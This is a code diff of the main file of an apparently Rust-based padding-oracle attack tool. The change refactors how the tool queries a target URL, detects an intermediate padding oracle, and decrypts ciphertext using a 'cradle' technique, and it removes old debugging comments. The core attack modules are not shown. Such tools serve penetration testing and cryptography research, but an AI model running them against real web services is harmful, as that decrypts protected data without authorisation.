@@ -2,19 +2,19 @@
 use std::time::Duration;
 
 use clap::{Parser, ValueEnum};
+use futures::future::join_all;
 use strum_macros::Display;
 use tokio::{sync::mpsc, time::sleep};
 
-use crate::{
-    crypt::{decrypt::{build_cradle, padding_oracle_decrypt}, detector::{Detector, IntermediateDetector, check_byte_creates_invalid_pt, decrypt_intermediate_block}, forge::padding_oracle_forge}, helper::{Config, Encoding, Messages, decode_ct, encode_ct}, oracle::{HTTPDoubleOracle, HTTPOracle, Oracle}, print::{fmt_bytes_custom, progress_bar}
-};
 use reqwest::{ Method};
+use crate::{crypt::{cradlehelpers::{ComputeCache, build_cradle, decrypt_intermediate_block}, detector::{Detector, IntermediateDetector}}, helper::{Config, Encoding}, oracle::{IntermediateOracle, Oracle}, print::fmt_bytes_custom, transport::HTTPTransport};
 
 pub mod crypt;
 pub mod errors;
 pub mod helper;
 pub mod print;
 pub mod oracle;
+pub mod transport;
 
 #[derive(Display, Debug, Clone, ValueEnum)]
 enum Block {
@@ -129,7 +129,7 @@ async fn main() {
             }
         }
 
-        let standard_oracle = Box::new(HTTPOracle::new(
+        let standard_transport = Box::new(HTTPTransport::new(
             (&args.url).to_owned().clone(),
             headers.clone(),
             args.method.clone().unwrap_or(Method::GET),
@@ -139,27 +139,18 @@ async fn main() {
             args.search_pat.clone(),
             args.proxy.clone(),
         ));
-        let standard_ct = standard_oracle.base_ct.clone();
+        let standard_ct = standard_transport.base_ct.clone();
 
-        let detect = IntermediateDetector::init(&standard_ct, standard_oracle, *block_size as usize, args.threads).await;
-        if detect.is_ok(){
+        let detect = IntermediateDetector::init(&standard_ct, standard_transport, *block_size as usize, args.threads).await;
+        if let Ok(detector) = detect{
             println!("Intermediate Oracle Detected");
-            let detector = detect.unwrap();
-            let chunks = detector.block_suffix.clone().chunks(*block_size as usize).map(|chunk| chunk.to_vec()).collect::<Vec<Vec<u8>>>();
-            let block_for_decryption = chunks[chunks.len()-2].clone();
-            let bad_chars = vec![ 0x00, 0x01, 0x02, 0x03, 0x22];
-            let cradle = build_cradle(&detector,&bad_chars, &block_for_decryption,&detector.block_prefix, &detector.block_suffix, 1000).await.unwrap();
-            println!("found cradle! {:?}", cradle);
-            let iv = chunks[chunks.len()-3].clone();
-            let (pt, _) = decrypt_intermediate_block(&detector, &bad_chars, &iv, &cradle.0, &block_for_decryption, &detector.block_prefix, &[cradle.1, detector.block_suffix.clone()].concat(), *block_size as usize).await;
-            println!("{}", fmt_bytes_custom(&pt));
-            //println!("{:?}", detector.check(&[detector.block_prefix.clone(), cradle.0, block_for_decryption,  cradle.1, detector.block_suffix.clone()].concat()).await)
-            //let cradle_verification = detector.check(&[detector.block_prefix.as_slice(), cradle.0.as_slice(), cradle.1.as_slice(), detector.block_suffix.as_slice()].concat()).await;
-            //println!("cradle {:?}", cradle_verification);
-            
-            //let res = check_byte_creates_invalid_pt(&detector, 0x0a, 2,&cradle.1, &detector.block_suffix[..*block_size as usize], &[detector.block_prefix.as_slice(), cradle.0.as_slice()].concat(), &detector.block_suffix[*block_size as usize..], 20).await;
-            //let res = check_byte_creates_invalid_pt(&detector, cradle.0[0], 0,&cradle.0, &cradle.1, &detector.block_prefix, &detector.block_suffix, 20).await;
-            //println!("{:?}", res);
+            let bad_chars = vec![ 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11,0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x22];
+            let (tx, rx) = mpsc::channel(255);
+            let intermediate_oracle = IntermediateOracle::new(detector, tx, *block_size as usize, &bad_chars);
+            let pt = intermediate_oracle.decrypt(&standard_ct).await;
+            if let Ok(pt) = pt{
+                println!("plaintext {:?}", fmt_bytes_custom(&pt));
+            }
         }else{
             println!("No Intermediate Oracle Detected");
         }
